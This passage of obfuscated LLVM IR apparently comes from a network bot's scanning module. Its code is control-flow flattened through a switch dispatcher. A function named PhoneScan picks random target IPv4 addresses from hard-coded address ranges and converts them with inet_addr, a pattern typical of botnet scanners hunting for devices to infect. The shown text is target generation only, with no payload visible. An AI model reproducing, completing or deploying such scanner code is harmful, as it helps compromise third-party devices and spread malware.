  %1617 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1618 = zext i8 %1617 to i32
  %1619 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1620 = zext i8 %1619 to i32
  %1621 = call i32 (i8*, i8*, ...) @szprintf(i8* %1616, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.179, i32 0, i32 0), i32 %1618, i32 %1620)
  store i32 -2093276989, i32* %switchVar
  br label %loopEnd

; <label>:1622:                                   ; preds = %loopEntry
  %1623 = load i32, i32* %1, align 4
  %1624 = icmp eq i32 %1623, 145
  %1625 = select i1 %1624, i32 -1820760619, i32 16900701
  store i32 %1625, i32* %switchVar
  br label %loopEnd

; <label>:1626:                                   ; preds = %loopEntry
  %1627 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1628 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1629 = zext i8 %1628 to i32
  %1630 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1631 = zext i8 %1630 to i32
  %1632 = call i32 (i8*, i8*, ...) @szprintf(i8* %1627, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.180, i32 0, i32 0), i32 %1629, i32 %1631)
  store i32 16900701, i32* %switchVar
  br label %loopEnd

; <label>:1633:                                   ; preds = %loopEntry
  %1634 = load i32, i32* %1, align 4
  %1635 = icmp eq i32 %1634, 146
  %1636 = select i1 %1635, i32 -1921684222, i32 -148289995
  store i32 %1636, i32* %switchVar
  br label %loopEnd

; <label>:1637:                                   ; preds = %loopEntry
  %1638 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1639 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1640 = zext i8 %1639 to i32
  %1641 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1642 = zext i8 %1641 to i32
  %1643 = call i32 (i8*, i8*, ...) @szprintf(i8* %1638, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.181, i32 0, i32 0), i32 %1640, i32 %1642)
  store i32 -148289995, i32* %switchVar
  br label %loopEnd

; <label>:1644:                                   ; preds = %loopEntry
  %1645 = load i32, i32* %1, align 4
  %1646 = icmp eq i32 %1645, 147
  %1647 = select i1 %1646, i32 -1823875023, i32 1452369808
  store i32 %1647, i32* %switchVar
  br label %loopEnd

; <label>:1648:                                   ; preds = %loopEntry
  %1649 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1650 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1651 = zext i8 %1650 to i32
  %1652 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1653 = zext i8 %1652 to i32
  %1654 = call i32 (i8*, i8*, ...) @szprintf(i8* %1649, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.182, i32 0, i32 0), i32 %1651, i32 %1653)
  store i32 1452369808, i32* %switchVar
  br label %loopEnd

; <label>:1655:                                   ; preds = %loopEntry
  %1656 = load i32, i32* %1, align 4
  %1657 = icmp eq i32 %1656, 148
  %1658 = select i1 %1657, i32 692784457, i32 960360385
  store i32 %1658, i32* %switchVar
  br label %loopEnd

; <label>:1659:                                   ; preds = %loopEntry
  %1660 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1661 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1662 = zext i8 %1661 to i32
  %1663 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1664 = zext i8 %1663 to i32
  %1665 = call i32 (i8*, i8*, ...) @szprintf(i8* %1660, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.183, i32 0, i32 0), i32 %1662, i32 %1664)
  store i32 960360385, i32* %switchVar
  br label %loopEnd

; <label>:1666:                                   ; preds = %loopEntry
  %1667 = load i32, i32* %1, align 4
  %1668 = icmp eq i32 %1667, 149
  %1669 = select i1 %1668, i32 2031895149, i32 914365591
  store i32 %1669, i32* %switchVar
  br label %loopEnd

; <label>:1670:                                   ; preds = %loopEntry
  %1671 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1672 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1673 = zext i8 %1672 to i32
  %1674 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1675 = zext i8 %1674 to i32
  %1676 = call i32 (i8*, i8*, ...) @szprintf(i8* %1671, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.184, i32 0, i32 0), i32 %1673, i32 %1675)
  store i32 914365591, i32* %switchVar
  br label %loopEnd

; <label>:1677:                                   ; preds = %loopEntry
  %1678 = load i32, i32* %1, align 4
  %1679 = icmp eq i32 %1678, 150
  %1680 = select i1 %1679, i32 -844324335, i32 553927101
  store i32 %1680, i32* %switchVar
  br label %loopEnd

; <label>:1681:                                   ; preds = %loopEntry
  %1682 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1683 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1684 = zext i8 %1683 to i32
  %1685 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1686 = zext i8 %1685 to i32
  %1687 = call i32 (i8*, i8*, ...) @szprintf(i8* %1682, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.185, i32 0, i32 0), i32 %1684, i32 %1686)
  store i32 553927101, i32* %switchVar
  br label %loopEnd

; <label>:1688:                                   ; preds = %loopEntry
  %1689 = load i32, i32* %1, align 4
  %1690 = icmp eq i32 %1689, 151
  %1691 = select i1 %1690, i32 -418487762, i32 -1920326422
  store i32 %1691, i32* %switchVar
  br label %loopEnd

; <label>:1692:                                   ; preds = %loopEntry
  %1693 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1694 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1695 = zext i8 %1694 to i32
  %1696 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1697 = zext i8 %1696 to i32
  %1698 = call i32 (i8*, i8*, ...) @szprintf(i8* %1693, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.186, i32 0, i32 0), i32 %1695, i32 %1697)
  store i32 -1920326422, i32* %switchVar
  br label %loopEnd

; <label>:1699:                                   ; preds = %loopEntry
  %1700 = load i32, i32* %1, align 4
  %1701 = icmp eq i32 %1700, 152
  %1702 = select i1 %1701, i32 -36198929, i32 829465366
  store i32 %1702, i32* %switchVar
  br label %loopEnd

; <label>:1703:                                   ; preds = %loopEntry
  %1704 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1705 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1706 = zext i8 %1705 to i32
  %1707 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1708 = zext i8 %1707 to i32
  %1709 = call i32 (i8*, i8*, ...) @szprintf(i8* %1704, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.187, i32 0, i32 0), i32 %1706, i32 %1708)
  store i32 829465366, i32* %switchVar
  br label %loopEnd

; <label>:1710:                                   ; preds = %loopEntry
  %1711 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1712 = call i32 @inet_addr(i8* %1711) #5
  ret i32 %1712

loopEnd:                                          ; preds = %1703, %1699, %1692, %1688, %1681, %1677, %1670, %1666, %1659, %1655, %1648, %1644, %1637, %1633, %1626, %1622, %1615, %1611, %1604, %1600, %1593, %1589, %1582, %1578, %1571, %1567, %1560, %1556, %1549, %1545, %1538, %1534, %1527, %1523, %1516, %1512, %1505, %1501, %1494, %1490, %1483, %1479, %1472, %1468, %1461, %1457, %1450, %1446, %1439, %1435, %1428, %1424, %1417, %1413, %1406, %1402, %1395, %1391, %1384, %1380, %1373, %1369, %1362, %1358, %1351, %1347, %1340, %1336, %1329, %1325, %1318, %1314, %1307, %1303, %1296, %1292, %1285, %1281, %1274, %1270, %1263, %1259, %1252, %1248, %1241, %1237, %1230, %1226, %1219, %1215, %1208, %1204, %1197, %1193, %1186, %1182, %1175, %1171, %1164, %1160, %1153, %1149, %1142, %1138, %1131, %1127, %1120, %1116, %1109, %1105, %1098, %1094, %1087, %1083, %1076, %1072, %1065, %1061, %1054, %1050, %1043, %1039, %1032, %1028, %1021, %1017, %1010, %1006, %999, %995, %988, %984, %977, %973, %966, %962, %955, %951, %944, %940, %933, %929, %922, %918, %911, %907, %900, %896, %889, %885, %878, %874, %867, %863, %856, %852, %845, %841, %834, %830, %823, %819, %812, %808, %801, %797, %790, %786, %779, %775, %768, %764, %757, %753, %746, %742, %735, %731, %724, %720, %713, %709, %702, %698, %691, %687, %680, %676, %669, %665, %658, %654, %647, %643, %636, %632, %625, %621, %614, %610, %603, %599, %592, %588, %581, %577, %570, %566, %559, %555, %548, %544, %537, %533, %526, %522, %515, %511, %504, %500, %493, %489, %482, %478, %471, %467, %460, %456, %449, %445, %438, %434, %427, %423, %416, %412, %405, %401, %394, %390, %383, %379, %372, %368, %361, %357, %350, %346, %339, %335, %328, %324, %317, %313, %306, %302, %295, %291, %284, %280, %273, %269, %262, %258, %251, %247, %240, %236, %229, %225, %218, %214, %207, %203, %196, %192, %185, %181, %174, %170, %163, %159, %152, %148, %141, %137, %130, %126, %119, %115, %108, %104, %97, %93, %86, %82, %75, %71, %64, %60, %53, %49, %42, %38, %31, %27, %20, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @PhoneScan() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %3 = call i32 @rand() #5
  %4 = srem i32 %3, 255
  %5 = trunc i32 %4 to i8
  store i8 %5, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %6 = call i32 @rand() #5
  %7 = srem i32 %6, 255
  %8 = trunc i32 %7 to i8
  store i8 %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %9 = call i32 @rand() #5
  %10 = srem i32 %9, 255
  %11 = trunc i32 %10 to i8
  store i8 %11, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %12 = call i32 @rand() #5
  %13 = srem i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %15 = call i32 @rand() #5
  %16 = srem i32 %15, 117
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  store i32 %17, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 304717348, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 304717348, label %first
    i32 -1344436322, label %20
    i32 1961023425, label %27
    i32 -1815285498, label %31
    i32 259618782, label %38
    i32 -418444899, label %42
    i32 -2121528606, label %49
    i32 -61137472, label %53
    i32 -216182188, label %60
    i32 -2080858140, label %64
    i32 325602555, label %71
    i32 2131883895, label %75
    i32 1131397136, label %82
    i32 -919047444, label %86
    i32 -1102421976, label %93
    i32 -1053056348, label %97
    i32 467178105, label %104
    i32 -349294675, label %108
    i32 -1668365409, label %115
    i32 -1940946069, label %119
    i32 870424737, label %126
    i32 -1526435040, label %130
    i32 455946900, label %137
    i32 -237699029, label %141
    i32 -307063739, label %148
    i32 -1070442086, label %152
    i32 2041092060, label %159
    i32 350551761, label %163
    i32 -1226556534, label %170
    i32 305750326, label %174
    i32 -1107400740, label %181
    i32 584098898, label %185
    i32 157196127, label %192
    i32 -367022452, label %196
    i32 1178980800, label %203
    i32 1009817214, label %207
    i32 712943312, label %214
    i32 137210779, label %218
    i32 -1174447670, label %225
    i32 -379501892, label %229
    i32 913456409, label %236
    i32 -1609370551, label %240
    i32 -681818756, label %247
    i32 882696430, label %251
    i32 -361802253, label %258
    i32 -2120744716, label %262
    i32 -2090159559, label %269
    i32 507388268, label %273
    i32 -109808081, label %280
    i32 -786343008, label %284
    i32 -1486479665, label %291
    i32 -407056449, label %295
    i32 -1951385409, label %302
    i32 301118599, label %306
    i32 399590604, label %313
    i32 -1986929658, label %317
    i32 975134000, label %324
    i32 1592211825, label %328
    i32 -714978184, label %335
    i32 -923321908, label %339
    i32 -1962667020, label %346
    i32 2066843503, label %350
    i32 -298176940, label %357
    i32 -471001480, label %361
    i32 -2097067279, label %368
    i32 260008461, label %372
    i32 1303285509, label %379
    i32 -276794767, label %383
    i32 697218158, label %390
    i32 221157222, label %394
    i32 974534782, label %401
    i32 -408901051, label %405
    i32 448399326, label %412
    i32 1468215586, label %416
    i32 1222983149, label %423
    i32 217318138, label %427
    i32 369192407, label %434
    i32 -280308085, label %438
    i32 -960885864, label %445
    i32 -1815221009, label %449
    i32 -549661162, label %456
    i32 -151455312, label %460
    i32 -802434205, label %467
    i32 -1144664630, label %471
    i32 -1765709412, label %478
    i32 280943431, label %482
    i32 -1262309983, label %489
    i32 87349760, label %493
    i32 -1795071925, label %500
    i32 393178621, label %504
    i32 -1041128751, label %511
    i32 1997694633, label %515
    i32 1901411429, label %522
    i32 1740235991, label %526
    i32 -856594543, label %533
    i32 1861171464, label %537
    i32 1390921466, label %544
    i32 -1280923565, label %548
    i32 1469915228, label %555
    i32 -1544401206, label %559
    i32 697623032, label %566
    i32 -1589798113, label %570
    i32 -2059035203, label %577
    i32 -1481430923, label %581
    i32 -768885822, label %588
    i32 1718920092, label %592
    i32 -1682935939, label %599
    i32 -1594726682, label %603
    i32 818124809, label %610
    i32 -1571217298, label %614
    i32 -2115201751, label %621
    i32 43877092, label %625
    i32 -1118813476, label %632
    i32 -735603139, label %636
    i32 -474579202, label %643
    i32 1855784263, label %647
    i32 -376642005, label %654
    i32 -144710476, label %658
    i32 -32022665, label %665
    i32 2013766544, label %669
    i32 1569585333, label %676
    i32 -1086125826, label %680
    i32 -1818457857, label %687
    i32 -480808470, label %691
    i32 -1750698492, label %698
    i32 -1867820177, label %702
    i32 2122339191, label %709
    i32 298356607, label %713
    i32 -585178581, label %720
    i32 -1684794353, label %724
    i32 389487654, label %731
    i32 -1720582419, label %735
    i32 -2128247146, label %742
    i32 -1674726786, label %746
    i32 -1660782848, label %753
    i32 -927126051, label %757
    i32 1301336999, label %764
    i32 -321597685, label %768
    i32 -12460095, label %775
    i32 -546469889, label %779
    i32 -1923199020, label %786
    i32 843038524, label %790
    i32 -64091027, label %797
    i32 -1133099796, label %801
    i32 1601515308, label %808
    i32 -601847766, label %812
    i32 -413124594, label %819
    i32 1184777280, label %823
    i32 1170197006, label %830
    i32 -1919220713, label %834
    i32 -484374830, label %841
    i32 -695647246, label %845
    i32 -1698960282, label %852
    i32 -734958684, label %856
    i32 740125440, label %863
    i32 -492168665, label %867
    i32 1883273579, label %874
    i32 -440043556, label %878
    i32 1766663056, label %885
    i32 -783305806, label %889
    i32 -1234506833, label %896
    i32 -1658777495, label %900
    i32 1332924232, label %907
    i32 1986894346, label %911
    i32 963720190, label %918
    i32 -1151477389, label %922
    i32 571135885, label %929
    i32 1494602009, label %933
    i32 -1842531561, label %940
    i32 1084986993, label %944
    i32 -2021227022, label %951
    i32 -1320815300, label %955
    i32 1950065096, label %962
    i32 164151286, label %966
    i32 1818643536, label %973
    i32 -727246971, label %977
    i32 -1469716526, label %984
    i32 -447300429, label %988
    i32 -1392299618, label %995
    i32 939254275, label %999
    i32 -241537202, label %1006
    i32 -722921825, label %1010
    i32 1693687573, label %1017
    i32 -1985123247, label %1021
    i32 2026228661, label %1028
    i32 891698106, label %1032
    i32 -1408904947, label %1039
    i32 397096643, label %1043
    i32 1192287599, label %1050
    i32 428598063, label %1054
    i32 293595338, label %1061
    i32 1759316675, label %1065
    i32 -381038726, label %1072
    i32 288551433, label %1076
    i32 -1939297690, label %1083
    i32 1588894693, label %1087
    i32 164805517, label %1094
    i32 -446177082, label %1098
    i32 -1255510513, label %1105
    i32 918460737, label %1109
    i32 61277403, label %1116
    i32 1957405589, label %1120
    i32 -1072293890, label %1127
    i32 -1949814277, label %1131
    i32 -1299689320, label %1138
    i32 -1366821756, label %1142
    i32 -1149617937, label %1149
    i32 905148499, label %1153
    i32 1359923823, label %1160
    i32 -1415606503, label %1164
    i32 -109065688, label %1171
    i32 1791888716, label %1175
    i32 188322268, label %1182
    i32 1063443420, label %1186
    i32 883426139, label %1193
    i32 -857950788, label %1197
    i32 2059112129, label %1204
    i32 -641429861, label %1208
    i32 -53038305, label %1215
    i32 403380414, label %1219
    i32 -1738094464, label %1226
    i32 939723855, label %1230
    i32 29192734, label %1237
    i32 927540982, label %1241
    i32 -1166129422, label %1248
    i32 -697707696, label %1252
    i32 -913910694, label %1259
    i32 1484760431, label %1263
    i32 -1954089727, label %1270
    i32 -1972444250, label %1274
    i32 1558500327, label %1281
    i32 1753748993, label %1285
    i32 -445952870, label %1292
    i32 -1075953749, label %1296
    i32 -965169359, label %1303
    i32 -1370656296, label %1307
    i32 1012545021, label %1314
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %18 = icmp eq i32 %.reload, 0
  %19 = select i1 %18, i32 -1344436322, i32 1961023425
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %22 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %25 = zext i8 %24 to i32
  %26 = call i32 (i8*, i8*, ...) @szprintf(i8* %21, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.188, i32 0, i32 0), i32 %23, i32 %25)
  store i32 1961023425, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %1, align 4
  %29 = icmp eq i32 %28, 1
  %30 = select i1 %29, i32 -1815285498, i32 259618782
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %33 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %34 = zext i8 %33 to i32
  %35 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %36 = zext i8 %35 to i32
  %37 = call i32 (i8*, i8*, ...) @szprintf(i8* %32, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.189, i32 0, i32 0), i32 %34, i32 %36)
  store i32 259618782, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %1, align 4
  %40 = icmp eq i32 %39, 2
  %41 = select i1 %40, i32 -418444899, i32 -2121528606
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %44 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %45 = zext i8 %44 to i32
  %46 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %47 = zext i8 %46 to i32
  %48 = call i32 (i8*, i8*, ...) @szprintf(i8* %43, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.190, i32 0, i32 0), i32 %45, i32 %47)
  store i32 -2121528606, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  %51 = icmp eq i32 %50, 3
  %52 = select i1 %51, i32 -61137472, i32 -216182188
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %55 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %56 = zext i8 %55 to i32
  %57 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %58 = zext i8 %57 to i32
  %59 = call i32 (i8*, i8*, ...) @szprintf(i8* %54, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.191, i32 0, i32 0), i32 %56, i32 %58)
  store i32 -216182188, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %1, align 4
  %62 = icmp eq i32 %61, 4
  %63 = select i1 %62, i32 -2080858140, i32 325602555
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %66 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %67 = zext i8 %66 to i32
  %68 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %69 = zext i8 %68 to i32
  %70 = call i32 (i8*, i8*, ...) @szprintf(i8* %65, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.192, i32 0, i32 0), i32 %67, i32 %69)
  store i32 325602555, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %1, align 4
  %73 = icmp eq i32 %72, 5
  %74 = select i1 %73, i32 2131883895, i32 1131397136
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %77 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %78 = zext i8 %77 to i32
  %79 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %80 = zext i8 %79 to i32
  %81 = call i32 (i8*, i8*, ...) @szprintf(i8* %76, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.193, i32 0, i32 0), i32 %78, i32 %80)
  store i32 1131397136, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %1, align 4
  %84 = icmp eq i32 %83, 6
  %85 = select i1 %84, i32 -919047444, i32 -1102421976
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %88 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %89 = zext i8 %88 to i32
  %90 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %91 = zext i8 %90 to i32
  %92 = call i32 (i8*, i8*, ...) @szprintf(i8* %87, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.194, i32 0, i32 0), i32 %89, i32 %91)
  store i32 -1102421976, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %1, align 4
  %95 = icmp eq i32 %94, 7
  %96 = select i1 %95, i32 -1053056348, i32 467178105
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %99 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %100 = zext i8 %99 to i32
  %101 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %102 = zext i8 %101 to i32
  %103 = call i32 (i8*, i8*, ...) @szprintf(i8* %98, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.195, i32 0, i32 0), i32 %100, i32 %102)
  store i32 467178105, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i32, i32* %1, align 4
  %106 = icmp eq i32 %105, 8
  %107 = select i1 %106, i32 -349294675, i32 -1668365409
  store i32 %107, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %110 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %111 = zext i8 %110 to i32
  %112 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %113 = zext i8 %112 to i32
  %114 = call i32 (i8*, i8*, ...) @szprintf(i8* %109, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.188, i32 0, i32 0), i32 %111, i32 %113)
  store i32 -1668365409, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i32, i32* %1, align 4
  %117 = icmp eq i32 %116, 9
  %118 = select i1 %117, i32 -1940946069, i32 870424737
  store i32 %118, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %121 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %122 = zext i8 %121 to i32
  %123 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %124 = zext i8 %123 to i32
  %125 = call i32 (i8*, i8*, ...) @szprintf(i8* %120, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.196, i32 0, i32 0), i32 %122, i32 %124)
  store i32 870424737, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i32, i32* %1, align 4
  %128 = icmp eq i32 %127, 10
  %129 = select i1 %128, i32 -1526435040, i32 455946900
  store i32 %129, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %132 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %133 = zext i8 %132 to i32
  %134 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %135 = zext i8 %134 to i32
  %136 = call i32 (i8*, i8*, ...) @szprintf(i8* %131, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.197, i32 0, i32 0), i32 %133, i32 %135)
  store i32 455946900, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i32, i32* %1, align 4
  %139 = icmp eq i32 %138, 11
  %140 = select i1 %139, i32 -237699029, i32 -307063739
  store i32 %140, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  %142 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %143 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %144 = zext i8 %143 to i32
  %145 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %146 = zext i8 %145 to i32
  %147 = call i32 (i8*, i8*, ...) @szprintf(i8* %142, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.198, i32 0, i32 0), i32 %144, i32 %146)
  store i32 -307063739, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %1, align 4
  %150 = icmp eq i32 %149, 12
  %151 = select i1 %150, i32 -1070442086, i32 2041092060
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %154 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %155 = zext i8 %154 to i32
  %156 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %157 = zext i8 %156 to i32
